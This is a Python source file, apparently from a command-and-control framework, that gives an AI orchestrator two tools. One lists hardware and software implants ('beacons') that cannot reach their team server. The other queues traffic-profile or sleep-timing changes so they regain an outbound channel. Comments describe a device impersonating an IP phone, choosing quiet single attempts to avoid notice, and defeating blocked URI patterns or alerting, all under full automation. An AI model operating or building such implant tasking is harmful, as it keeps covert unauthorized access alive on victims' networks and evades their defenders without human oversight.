#!/usr/bin/env python3
"""Orchestrator tools for a beacon that cannot get out.

A beacon whose upstream legs have all failed — HTTPS, SMB, QUIC and, on a
hardware implant, gsocket — sends one
encrypted diagnostic over DNS (see `software/c2/dns_rescue.py`), and the
team server attaches it to that agent's record as `stuck`. These two tools
are the other half: the orchestrator reads the diagnosis and queues **one**
next attempt.

One, not a sweep. The design considered having the server guess a list of
candidate proxies and ports and try them in sequence, and refused it: a
dozen attempts from a device impersonating an IP phone is louder than the
single short query that reported the problem. So `try_egress` takes one
attempt and the model comes back for the next.

These are the first orchestrator tools that read the fleet, so `Context`
carries a C2 client for them. A run built without one simply is not
offered them, which is how every other optional tool in this package
behaves.
"""

import json

from software.agent.c2client import C2Unauthorized, C2Unavailable
from software.agent.llm.provider import ToolSpec
from software.agent.tools import CORE, Entry
from software.c2.dns_rescue import TRANSPORTS

# What the model may ask for, mapped to the verb the implant actually
# dispatches. This mapping is the whole reason this constant exists: the
# first version of this tool offered "proxy", "transport" and "interval",
# none of which the beacon has a branch for, so it queued work that could
# never run and nothing failed. A test now reads the beacon's own dispatch
# and checks every value here against it.
#
# The honest limit, stated here because it shapes what this tool can do:
# **the implant has no command that changes its proxy or its transport.**
# Those are fixed when it is generated. What can be changed at runtime is
# the traffic profile and the timing -- which still covers a real class of
# cause, since a blocked URI pattern or an alerting cadence is a plausible
# reason for a leg to fail. Anything else needs a new beacon-side verb.
ATTEMPT_VERBS = {
    "profile": "reconfig",
    "sleep": "sleep",
}


# What the implant's `reconfig` branch reads. Anything else is refused
# rather than sent and silently ignored.
RECONFIG_KEYS = frozenset(("c2_profile", "sleeptime", "jitter"))


def _stuck_of(agent):
    stuck = agent.get("stuck") if isinstance(agent, dict) else None
    return stuck if isinstance(stuck, dict) else None


def _leg_report(record):
    return {
        "summary": record.get("summary", ""),
        # False means nothing can leave: the resolver did not answer, so a
        # queued attempt will never reach it either.
        "dns_answered": bool(record.get("dns_answered")),
        "reported_at": record.get("at", ""),
        # Read off `dns_rescue.TRANSPORTS` rather than written out here.
        # This dict was `("https", "dns", "smb", "quic")` for the whole of
        # the gsocket leg's life, so a beacon stuck with `binary_missing`
        # or `carrier_failed` handed the campaign model four keys and no
        # mention of the leg that failed -- the class survived only inside
        # `summary`. `beacon.py`'s own comment on the config mapping names
        # the shape: two copies of one mapping, both missing the same
        # half, is how that survives a year.
        "legs": {leg: record.get(leg) for leg in TRANSPORTS},
    }


def _unattributed_entry(record):
    entry = _leg_report(record)
    # The two-byte tag the beacon sent, shown as the server's own log shows
    # it. It is a hash, not an id: it names nothing that can be tasked, but
    # two entries with the same value are very likely the same beacon.
    fp = record.get("fingerprint")
    ok = isinstance(fp, int) and not isinstance(fp, bool) and 0 <= fp <= 0xFFFF
    entry["fingerprint"] = "%04x" % fp if ok else ""
    return entry


def _get_stuck_beacons(ctx):
    async def get_stuck_beacons():
        agents = await ctx.c2.list_agents()
        out = []
        for agent in agents or ():
            stuck = _stuck_of(agent)
            if stuck is None:
                continue
            entry = _leg_report(stuck)
            entry["beacon_id"] = agent.get("id") or agent.get("agent_id")
            entry["hostname"] = agent.get("hostname", "")
            out.append(entry)

        # Rescues the server could not attribute to any beacon. They are
        # reported under their own key because there is no id to task: mixed
        # into `stuck`, a model would try to queue work against one.
        #
        # If the fetch fails the key is OMITTED, not emptied: present means
        # "I asked", so an empty list means there are none, and an absent
        # key means the question could not be put. A team server older than
        # the route answers 405 (its catch-all takes only POST). The
        # exceptions are listed on purpose and must not be "simplified" to
        # `except Exception`: a programming error on this path should crash
        # loudly, not turn into a quiet "no unattributed rescues".
        result = {"stuck": out}
        try:
            records = await ctx.c2.unattributed_rescues()
        except (C2Unavailable, C2Unauthorized):
            return result
        result["unattributed"] = [_unattributed_entry(r) for r in records or ()
                                  if isinstance(r, dict)]
        return result

    return get_stuck_beacons


def _try_egress(ctx):
    async def try_egress(beacon_id, attempt, value):
        if not isinstance(beacon_id, str) or not beacon_id:
            return {"error": "beacon_id is required"}
        if not isinstance(attempt, str) or attempt not in ATTEMPT_VERBS:
            return {"error": "attempt must be one of %s"
                             % ", ".join(sorted(ATTEMPT_VERBS)),
                    "got": str(attempt)[:40]}
        if not isinstance(value, str) or not value.strip():
            return {"error": "value is required"}
        value = value.strip()

        # Validated per verb, not waved through. This tool is reachable in
        # full automation, so the string a model wrote must not become an
        # argument nobody checked.
        args, data = "", ""
        if attempt == "sleep":
            if not value.isdigit():
                return {"error": "sleep takes a whole number of seconds",
                        "got": value[:40]}
            args = value
        else:
            try:
                parsed = json.loads(value)
            except ValueError:
                return {"error": "profile takes a JSON object for reconfig",
                        "got": value[:60]}
            if not isinstance(parsed, dict):
                return {"error": "profile takes a JSON object, not %s"
                                 % type(parsed).__name__}
            unknown = set(parsed) - RECONFIG_KEYS
            if unknown:
                return {"error": "reconfig accepts only %s"
                                 % ", ".join(sorted(RECONFIG_KEYS)),
                        "unknown": sorted(unknown)[:5]}
            data = json.dumps(parsed)

        agent = await ctx.c2.get_agent(beacon_id)
        if not agent:
            return {"error": "no such beacon %r" % beacon_id[:40]}
        if _stuck_of(agent) is None:
            # Retuning a beacon that is working is a way to lose a channel
            # that was fine, and in full automation nobody is watching.
            return {"error": "beacon %r has not reported being stuck; "
                             "read get_stuck_beacons first" % beacon_id[:40]}
        await ctx.c2.queue_task(beacon_id, ATTEMPT_VERBS[attempt], args=args,
                                data=data, lane="agent")
        return {"queued": ATTEMPT_VERBS[attempt], "beacon_id": beacon_id,
                "note": "one attempt per call; read get_stuck_beacons again "
                        "after the next check-in"}

    return try_egress


def entries():
    return [
        Entry(
            ToolSpec(
                "get_stuck_beacons",
                "List beacons that reported being unable to reach the team "
                "server, with the reason each leg failed. `dns_answered` "
                "false means nothing can leave that host, so a queued "
                "attempt will not arrive either. `unattributed` lists "
                "rescues the server could not match to any beacon: those "
                "entries have no id and cannot be tasked, so do not try to "
                "queue anything for them -- they are evidence that a beacon "
                "is stuck somewhere, nothing more. Entries with the same "
                "`fingerprint` are very likely the same beacon. If the "
                "`unattributed` key is absent the server could not be asked; "
                "present and empty means it was asked and there are none.",
                {"type": "object", "properties": {}}),
            ("orchestrator",), CORE, _get_stuck_beacons,
            requires_c2=True),
        Entry(
            ToolSpec(
                "try_egress",
                "Queue ONE next attempt for a stuck beacon, chosen from its "
                "diagnosis. One per call, deliberately: a sweep of "
                "candidates is far louder than the problem it solves. The "
                "implant cannot change its proxy or its transport at "
                "runtime -- what you can change is its traffic profile and "
                "its timing.",
                {"type": "object",
                 "properties": {
                     "beacon_id": {"type": "string",
                                   "description": "the stuck beacon"},
                     "attempt": {"type": "string",
                                 "enum": sorted(ATTEMPT_VERBS),
                                 "description": "profile swaps the traffic "
                                                "profile; sleep changes the "
                                                "check-in interval"},
                     "value": {"type": "string",
                               "description": "for sleep, whole seconds; for "
                                              "profile, a JSON object with "
                                              "c2_profile, sleeptime or "
                                              "jitter"}},
                 "required": ["beacon_id", "attempt", "value"]}),
            ("orchestrator",), CORE, _try_egress,
            requires_c2=True),
    ]
